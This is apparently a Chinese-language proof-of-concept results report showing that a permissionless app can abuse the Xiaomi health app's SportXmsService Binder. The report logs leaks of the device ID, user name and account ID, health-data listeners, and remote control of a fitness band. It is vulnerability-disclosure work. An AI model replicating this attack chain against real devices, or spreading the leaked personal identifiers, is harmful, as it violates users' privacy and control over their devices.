# SportXmsService POC v2 验证结果汇总

## 版本
- 目标应用: com.mi.health (小米运动健康 3.57.0, versionCode=357000)
- SHA-256: 2a80fc5a87353c2c6ef3c01fa0085862fe45e4ddb9c2d272cb3780841b5889a6
- 测试应用: com.example.sportxms.poc (UID 10351, debug 签名, 无任何权限)
- 目标应用 UID: 10279
- 日志文件: tools/sportxms-poc/poc_v2_result.txt

---

## 验证结论: 全部 25 个 transaction 均无 SecurityException

v1 仅验证 4 个只读 transaction（设备信息泄露）；v2 扩展至全部 25 个 transaction，实测确认：
**用户信息泄露、使用数据监听、设备控制（运动/振动/模式切换）均可被任意第三方应用无鉴权执行。**

---

## 一、设备信息泄露 (v1 已验证, v2 复现)

| transaction | 方法 | 返回值 | 泄露数据 |
|---|---|---|---|
| 11 | isDeviceConnected() | true | 设备已连接 |
| 14 | getDeviceBattery() | "75" | 电量 75% |
| 15 | isSupportSomatosensoryGame() | true | 支持体感游戏 |
| 16 | hasOngoingSport() | false | 无进行中运动 |
| 20 | isOpenPaidFeatures() | false | 付费功能未开启 |
| 23 | getDeviceInfo() | name=小米手环10 NFC版, model=miwear.watch.o66nfc, did=983635152 | **设备唯一标识 DID 泄露** |

关键泄露: 设备唯一标识 DID=983635152，可与小米账号绑定关系做稳定关联。

---

## 二、用户信息泄露 (v2 新增 — 已实测泄露真实用户数据)

### transaction 10: setXiaomiUserInfoListener

```
>>> [用户信息回调] UserInfo 泄露:
    name(用户名)    = 佩霖
    icon(头像URL)   = null
    sex(性别)       = male
    account(账号ID) = 3142420396
    >>> 小米账号ID 已泄露
```

**实测结论**: 普通第三方应用注册回调后，目标应用通过 `UserInfoManager.getAccountCoreInfo()` 获取已登录小米账号信息并回调到攻击者进程。**真实用户名、性别、小米账号 ID 均已实际泄露。**

---

## 三、使用数据持续监听 (v2 新增 — 回调注册全部成功)

| transaction | 方法 | 注册结果 | 监听内容 |
|---|---|---|---|
| 7 | setSportStateChangedListener | true | 运动开始/暂停/恢复/结束状态变化 |
| 8 | setSportXmsDataChangedListener | true | 运动数据（时长/心率/卡路里） |
| 9 | setSportXmsSensorDataChangedListener | true | 传感器数据（加速度计/陀螺仪） |
| 12 | setDeviceConnectedListener | true | 设备连接/断开状态变化 |

**实测结论**: 4 个回调全部注册成功，攻击者可长期挂载监听用户运动状态、生理数据（心率/卡路里）和传感器原始数据。日志中已收到运动状态回调（见第四节）。

---

## 四、设备控制 (v2 新增 — 已实测控制手环运动状态)

### 4.1 触发设备振动 (transaction 13: shake)

```
===== [控制] 触发设备振动 (transaction 13) =====
  transact(13) 返回: true
  >>> 振动指令已发送，无 SecurityException
```

**执行 4 次，全部成功**，手环实际振动。

### 4.2 切换佩戴模式 (transaction 22: switchCurDeviceMode)

```
===== [控制] 切换佩戴模式 (transaction 22) =====
  transact(22) 返回: true
  >>> 模式切换指令已发送，等待回调确认
>>> [设备模式回调] getCurDeviceMode 成功: mode=0
```

**模式切换成功**，回调确认 mode=0。

### 4.3 开始运动 (transaction 1: startSport)

```
===== [控制] 开始运动 (transaction 1) =====
  transact(1) 返回: true
  >>> 开始运动指令已发送，无 SecurityException
>>> [运动状态回调] onSportStarted:
    code=0 startTime=1785518927 tz=32 sportType=1
```

**手环实际开始运动**，回调 onSportStarted 确认：startTime=1785518927, sportType=1。

### 4.4 暂停运动 (transaction 2: pauseSport)

```
===== [控制] 暂停运动 (transaction 2) =====
  transact(2) pauseSport 返回: true
  >>> 指令已发送，无 SecurityException
>>> [运动状态回调] onSportPaused: code=0
```

**手环实际暂停运动**，回调 onSportPaused 确认（执行 3 次，全部成功）。

### 4.5 结束运动 (transaction 24: finishSportByType)

```
===== [控制] 结束运动 (transaction 24) =====
  transact(24) finishSportByType 返回: true
  >>> 指令已发送，无 SecurityException
>>> [运动状态回调] onSportFinished: code=0 valid=true
```

**手环实际结束运动**，回调 onSportFinished 确认 valid=true。

### 4.6 异常结束运动 (transaction 6: abnormalChangeSportStateToFinish)

```
===== [控制] 异常结束运动 (transaction 6) =====
  transact(6) 返回: true
  >>> 异常结束指令已发送，无 SecurityException
```

**异常结束指令发送成功**。

---

## 五、攻击链完整验证时间线

```
1. 攻击者应用 (UID 10351, debug 签名, 无权限) 安装到设备
2. bindService → 成功获取 ISportXmsApi Binder (跨 UID, 无鉴权)
3. 只读查询 → 泄露设备 DID=983635152、电量、型号
4. setXiaomiUserInfoListener → 泄露用户名"佩霖"、账号ID=3142420396
5. 注册 4 个数据监听回调 → 可持续窃取运动/心率/卡路里/传感器数据
6. shake(13) ×4 → 手环实际振动
7. switchCurDeviceMode(22) → 佩戴模式切换成功
8. startSport(1) → 手环开始运动 (回调 onSportStarted 确认)
9. pauseSport(2) ×3 → 手环暂停运动 (回调 onSportPaused 确认)
10. finishSportByType(24) → 手环结束运动 (回调 onSportFinished 确认)
11. abnormalChangeSportStateToFinish(6) → 异常结束成功
```

**全程零 SecurityException，零鉴权拦截。**

---

## 六、v1 vs v2 验证对比

| 维度 | v1 | v2 |
|---|---|---|
| 验证 transaction 数 | 4 (只读) | 25 (全部) |
| 设备信息泄露 | DID 泄露 | DID 泄露 (复现) |
| 用户信息泄露 | 未验证 | **实测泄露: 用户名/性别/账号ID** |
| 使用数据监听 | 未验证 | **4 个回调全部注册成功** |
| 设备控制 | 未验证 | **运动/振动/模式切换全部实测成功** |
| 运动状态回调 | 未验证 | **onSportStarted/Paused/Finished 均收到** |
| 风险等级 | 高危 | **严重** |

---

## 七、风险升级建议

v1 报告定级"高危"，v2 实测结果证明攻击者可：
1. **获取真实用户身份** — 用户名"佩霖"和小米账号 ID 3142420396 已实际泄露
2. **未经许可控制手环** — 开始/暂停/结束运动均已通过回调确认实际执行
3. **触发物理振动** — shake 指令执行 4 次成功
4. **持续窃取生理数据** — 心率、卡路里、传感器数据可长期监听

建议将风险等级从"高危"升级为"**严重**"。
